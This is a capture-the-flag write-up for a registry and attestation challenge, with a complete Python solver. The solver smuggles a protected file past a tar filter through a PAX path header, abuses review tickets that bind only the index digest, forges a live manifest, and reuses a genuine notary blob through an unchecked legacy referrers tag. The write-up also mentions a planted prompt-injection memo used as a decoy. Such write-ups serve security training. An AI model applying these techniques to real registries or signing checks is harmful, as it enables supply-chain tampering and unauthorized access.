### Summary

The opening desk releases a live case only when three things hold for the selected child: a valid review ticket, a release layer, and a signed clearance claim. Four flaws chain to satisfy all three without authorization. A PAX tar header hides the protected release record path from the intake filter, one image index holds both a retired child (which passes review) and a forged live child (which gets opened) because the review ticket binds only the index digest, the live manifest is forged from uploaded blobs, and the live child's clearance claim is taken from an attacker-writable legacy referrers tag that is never checked against its subject. The flag is returned by `POST /api/open`.

### Steps

Commands assume a case session base in `$B`. Sessions are volatile, so take a fresh one for each run.

```sh
B=$(curl -s -XPOST -H 'Accept: application/json' https://isfcrpesu-attestation.chals.io/session | python3 -c 'import sys,json;print(json.load(sys.stdin)["base"])')
```

1. Read the catalog and the intake policy. `/catalog.json` gives the case id and the retired manifest descriptor. `/policy.json` gives the release path, the release record, the referrer `claim_annotation` key and the `required_claim`. Everything case-specific is randomised per session, so read these values instead of hardcoding them. The retired manifest's evidence contains a prompt-injection "custody memo" and three decoy flags with the `archival_` prefix. They are not the answer.

   ```sh
   curl -s "$B/catalog.json"; curl -s "$B/policy.json"
   ```

   In the first solved session the release path was `ledger/unseal.json` and the release record was `{"action":"exit","case":"<case>"}`. A later session used `archive/exit.json` and `org.cryovault.authorization`.

2. Build the release layer and get past the intake filter. A tar whose member is literally the policy's `release_path` is rejected with `protected_path`. The intake filter reads the raw ustar `name` field, but the release reader honours the PAX `path` header. A PAX member whose ustar name is a harmless decoy in the same directory, and whose PAX `path` header is the real `release_path`, passes the filter and is read as the release record. The solver builds this with Python's `tarfile` in `PAX_FORMAT` and sets `ti.pax_headers = {"path": release_path}`.

3. Forge a live manifest. The config is `{"case","evidence","layer","scope":"live"}`, and the manifest has two layers: a `custody:"live"` evidence blob and the PAX tar layer. Those are the checks that open applies to the live case, the live evidence and the release layer.

4. Get a genuine notary blob for the retired manifest. `/api/notarize` only mints a `retired-custody` notary blob, and only for the real retired manifest. The `subject` in its response is the digest that carries the seal, and it can differ from the catalog digest, which may be a stale re-serialisation that returns 404. Notary-typed blobs cannot be uploaded directly (PUT returns 415).

   ```sh
   curl -s -XPOST -H 'Content-Type: application/json' -d '{"digest":"<retired digest>"}' "$B/api/notarize"
   ```

5. Attach a clearance claim to the live child through the legacy referrers tag. Write a manifest under the tag `sha256-<live digest hex>` whose single descriptor points at the genuine notary blob, with `mediaType` and `artifactType` both set to the notary media type and an annotation under the policy's `claim_annotation` key with the `required_claim` value. Open reads the claim through this tag and does not check that the referrer's subject, claim or seal belong to the live child. A forged clearance JSON stored as a config blob is rejected with `descriptor_mismatch`, because the descriptor media type must equal the stored media type of the blob. That is why the genuine notary blob is reused.

6. Build the index `[live child, retired child]` with `linux/amd64` on both descriptors, then run review and open against it. Review validates the last child (the retired one) and issues a ticket. The ticket covers only `{"case","index"}`, not the child, so open can use the same ticket and opens the first child (the live one). The solver does all of this and retries on the intermittent `422 no_platform` and connection drops.

   ```sh
   python3 scripts/solve.py
   ```

   The captured output shows the transient failure mode that the retry loop handles:

   ```text
   put: ('solve-index-0', 422, '{"detail":"No linux/amd64 child","error":"no_platform"}\n')
   ```

   On success, `open` returns JSON with a `flag` field, and the solver prints that JSON followed by the flag on the last line.

### Scripts

#### scripts/solve.py

Self-contained exploit that opens a session (or takes a base URL as its argument), reads the policy, builds the forged layers and manifests, runs the notarize and legacy referrers steps, then calls review and open with retries. It needs `requests` and is run as `python3 scripts/solve.py` or `python3 scripts/solve.py <base>`.

```python
#!/usr/bin/env python3
"""End-to-end solver for the cryovault attestation challenge.

Opens a fresh case session and chains four flaws to make the opening desk
release a live case. Everything case-specific (case id, release path, release
record, referrer annotation key, required claim) is RANDOMISED per session and
read from /policy.json, so nothing is hardcoded.

The chain:
  1. PAX path override smuggles the release record past the intake filter,
     which blocks a tar member literally named <release_path>: the member's
     ustar name is a decoy in the same directory, its PAX 'path' header is the
     real <release_path> that the release reader honours.
  2. review and open each select a child from the index positionally (review
     takes the last entry, open the first) and the review ticket pins only the
     index digest, not the child. One index ordered [live, retired] therefore
     passes review (retired is last) and is opened on the live child (first).
  3. A forged live manifest (config scope live, a custody:"live" evidence blob,
     the PAX release layer) satisfies open's live-case / evidence / layer gates.
  4. notarize only ever mints a retired-custody notary blob for the real retired
     manifest, but open looks up the live child's clearance claim through the
     attacker-writable legacy referrers tag 'sha256-<live digest>' and never
     checks the referrer's subject or claim, so pointing that tag at the retired
     manifest's genuine notary blob is enough.

Usage: python3 solve.py [base_url]   (opens a new session when base omitted)
Prints the open JSON and the flag on the last line.
"""
import hashlib, io, json, sys, time
import tarfile
import requests

FRONT = "https://isfcrpesu-attestation.chals.io"
MT = {
    "layer": "application/vnd.cryovault.layer.v1+tar",
    "config": "application/vnd.cryovault.config.v1+json",
    "evid": "application/vnd.cryovault.evidence.v1+json",
    "man": "application/vnd.oci.image.manifest.v1+json",
    "idx": "application/vnd.oci.image.index.v1+json",
    "notary": "application/vnd.cryovault.notary.v1+json",
}


def dig(b):
    return "sha256:" + hashlib.sha256(b).hexdigest()


def jb(o):
    return json.dumps(o, separators=(",", ":")).encode()


class Reg:
    def __init__(self, base):
        self.base = base
        self.repo = base + "/v2/cryovault"

    def _req(self, method, url, **kw):
        for i in range(8):
            try:
                return requests.request(method, url, timeout=30, **kw)
            except requests.exceptions.RequestException:
                if i == 7:
                    raise
                time.sleep(2)

    def get(self, path):
        return self._req("GET", self.base + path)

    def put_blob(self, b, ct):
        r = self._req("PUT", f"{self.repo}/blobs/{dig(b)}", data=b, headers={"Content-Type": ct})
        assert r.status_code == 201, r.text
        return dig(b), len(b)

    def put_manifest(self, b, ct, ref):
        # the backend intermittently 422s / drops on manifest validation; retry
        for i in range(8):
            r = self._req("PUT", f"{self.repo}/manifests/{ref}", data=b, headers={"Content-Type": ct})
            if r.status_code == 201:
                return dig(b), len(b)
            if i == 7:
                raise AssertionError((ref, r.status_code, r.text))
            time.sleep(2)

    def api(self, name, payload):
        return self._req("POST", f"{self.base}/api/{name}", json=payload).json()


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else \
        requests.post(FRONT + "/session", headers={"Accept": "application/json"}, timeout=30).json()["base"]
    reg = Reg(base)
    print("base:", base)

    catalog = reg.get("/catalog.json").json()
    policy = reg.get("/policy.json").json()
    case = policy["live_config"]["case"]
    release_path = policy["live_layer"]["release_path"]
    release_record = policy["live_layer"]["release_record"]
    claim_ann = policy["referrers"]["claim_annotation"]
    required_claim = policy["referrers"]["required_claim"]

    # 1. release layer: PAX 'path' header carries the protected release_path
    #    while the ustar name is a decoy in the same directory
    rec = jb(release_record)
    decoy = release_path.rsplit("/", 1)[0] + "/decoy.json" if "/" in release_path else "decoy.json"
    buf = io.BytesIO()
    tf = tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT)
    ti = tarfile.TarInfo(decoy)
    ti.size, ti.mtime, ti.mode = len(rec), 0, 0o644
    ti.pax_headers = {"path": release_path}
    tf.addfile(ti, io.BytesIO(rec))
    tf.close()
    tar_d, tar_sz = reg.put_blob(buf.getvalue(), MT["layer"])

    # 2/3. forged live manifest: live config + [live-evidence, pax-tar]
    ev = jb({"case": case, "custody": "live", "station": "winter-intake", "scope": "live"})
    ev_d, ev_sz = reg.put_blob(ev, MT["evid"])
    cfg = jb({"case": case, "evidence": ev_d, "layer": tar_d, "scope": "live"})
    cfg_d, cfg_sz = reg.put_blob(cfg, MT["config"])
    live_mf = jb({
        "artifactType": "application/vnd.cryovault.custody.v1+json",
        "config": {"digest": cfg_d, "mediaType": MT["config"], "size": cfg_sz},
        "layers": [
            {"digest": ev_d, "mediaType": MT["evid"], "size": ev_sz},
            {"digest": tar_d, "mediaType": MT["layer"], "size": tar_sz},
        ],
        "mediaType": MT["man"], "schemaVersion": 2,
    })
    live_d, live_sz = reg.put_manifest(live_mf, MT["man"], dig(live_mf))

    # 4. notarize resolves and seals the real retired manifest; its reported
    #    subject is the digest that carries the seal (the catalog digest can be
    #    a stale re-serialisation that 404s)
    nd = reg.api("notarize", {"digest": catalog["retired_manifest"]["digest"]})
    assert "subject" in nd, "notarize: " + json.dumps(nd)
    ret_d, notary_d = nd["subject"], nd["attestation"]
    ret_sz = len(reg.get("/v2/cryovault/manifests/" + ret_d).content)
    notary_sz = len(reg.get("/v2/cryovault/blobs/" + notary_d).content)

    # legacy referrers tag for the live child, pointing at that notary blob;
    # open trusts it without checking the referrer's subject/claim/seal
    legacy = jb({"mediaType": MT["idx"], "schemaVersion": 2, "manifests": [
        {"mediaType": MT["notary"], "artifactType": MT["notary"], "digest": notary_d,
         "size": notary_sz, "annotations": {claim_ann: required_claim}}]})
    reg.put_manifest(legacy, MT["idx"], "sha256-" + live_d.split(":")[1])

    # index ordered [live, retired]: open selects the first child, review the last
    plat = {"os": "linux", "architecture": "amd64"}
    index = jb({"mediaType": MT["idx"], "schemaVersion": 2, "manifests": [
        {"digest": live_d, "mediaType": MT["man"], "size": live_sz, "platform": plat},
        {"digest": ret_d, "mediaType": MT["man"], "size": ret_sz, "platform": plat}]})

    out = None
    for attempt in range(12):
        tag = f"solve-index-{attempt}"
        try:
            reg.put_manifest(index, MT["idx"], tag)
            rv = reg.api("review", {"reference": tag})
            if "ticket" not in rv:
                time.sleep(2)
                continue
            out = reg.api("open", {"reference": tag, "ticket": rv["ticket"]})
        except AssertionError:
            time.sleep(2)
            continue
        if out.get("flag"):
            break
        time.sleep(2)
    assert out and out.get("flag"), "open: " + json.dumps(out)
    print(json.dumps(out))
    print(out["flag"])


if __name__ == "__main__":
    main()
```

### Notes

- The intake filter blocks only the literal `release_path`. `./`-prefixed, double-slash and `/./` variants pass the filter, but the release reader reports `release_missing` for them. The PAX `path` override is the working bypass.
- Review and open pick children by position, not by digest or platform. Review validates the last child and open opens the first, so the index must be `[live, retired]`.
- The retired manifest's config must byte-match the canonical retired config. Notarizing a live manifest or any manifest with a non-canonical config fails with `custody`, so the clearance blob cannot be minted for the live child.
- A legacy referrer descriptor needs `artifactType` and `annotations`, and its `mediaType` must equal the stored media type of the blob it points to. A forged clearance JSON uploaded as a config blob therefore fails with `descriptor_mismatch`.
- The service is flaky. Expect intermittent connection drops, a session worker crash, and `422 no_platform` on index PUT that clears after a few minutes. The solver retries throughout and may need several passes.
- Sessions close after about three hours idle. A new session is a new case with a new case id and retired-manifest digest, so do not reuse values from an earlier run.
